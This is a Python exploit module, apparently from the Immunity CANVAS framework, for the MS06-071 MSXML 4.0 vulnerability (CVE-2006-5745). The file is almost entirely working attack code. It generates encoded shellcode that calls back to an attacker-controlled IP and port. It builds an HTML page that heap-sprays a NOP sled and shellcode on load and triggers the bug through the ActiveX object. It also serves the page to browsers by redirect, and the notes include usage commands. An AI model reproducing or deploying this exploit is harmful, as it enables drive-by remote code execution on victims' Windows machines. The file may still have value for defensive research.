#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside

NAME='Microsoft XML Core Services 4.0 Vulnerability'
DESCRIPTION='Microsoft XML Core Services 4.0 Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='11/14/06'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS06-071.mspx'
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2006-5745'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5745'
DOCUMENTATION['CVSS'] = 7.6

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']
PROPERTY['MSADV']='MS06-071'
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
Tested on:
Windows XP Professional SP2 English OOTB with MSXML 4.0 SP2 English
Windows 2000 Professional SP4 French UP2DATE with MSXML 4.0 SP2 French
Windows 2003 Server Standard SP0 English OOTB with MSXML 4.0 SP2 English

Usage:
./commandlineInterface.py -p 5555 -v 9
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:ms06_071 -l 10.10.11.1 -d 5555 -p 8080 -O httpmosdef:1
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.version=0
        self.badstring='\0\xff'
        self.name=NAME
        self.filename='test.html'
        return

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        httpWrapper=''
        try:
            if self.HTTPMOSDEF:
                print '[!] using HTTP MOSDEF tunneling ..'
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x1000})
                if self.useSSLMOSDEF:
                    ssl='s'
                else:
                    ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http%s://%s:%d'%(ssl,host,port)})
                httpWrapper=sc.get()
                print '[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper))
        except:
            httpWrapper=''
        rawshellcode=self.createInjectToSelf(host,port,injectme=httpWrapper,movetostack=True)
        from encoder import chunkedaddencoder
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode=encoder.encode(rawshellcode)
        return self.shellcode

    def makefile(self):
        filedata="""
<html xmlns="http://www.w3.org/1999/xhtml">
<body>
<object id=target classid="CLSID:{88d969c5-f192-11d4-a65f-0040963251e5}">
</object>
<script>
var obj=null;
function exploit() {
    obj=document.getElementById('target').object;
    try {
        obj.open(new Array(),new Array(),new Array(),new Array(),new Array());
    } catch(e) {};
    sh=unescape("SHELLCODE");
    sz=sh.length*2;
    npsz=0x400000-(sz+0x38);
    nps=unescape("%u0D0D%u0D0D");
    while (nps.length*2<npsz) nps+=nps;
    ihbc=(0x12000000-0x400000)/0x400000;
    mm=new Array();
    for (i=0;i<ihbc;i++) mm[i]=nps+sh;
    obj.open(new Object(),new Object(),new Object(),new Object(),new Object());
    obj.setRequestHeader(new Object(),'......');
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
    obj.setRequestHeader(new Object(),0x12345678);
}
</script>
<body onLoad='exploit()' value='Exploit'>
</body>
</html>""".replace('SHELLCODE',urluencode('AAAA'+self.shellcode)) #'AAAA' is necessary for instructions alignement
        return filedata

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
    
    def getArgs(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        filedata=self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
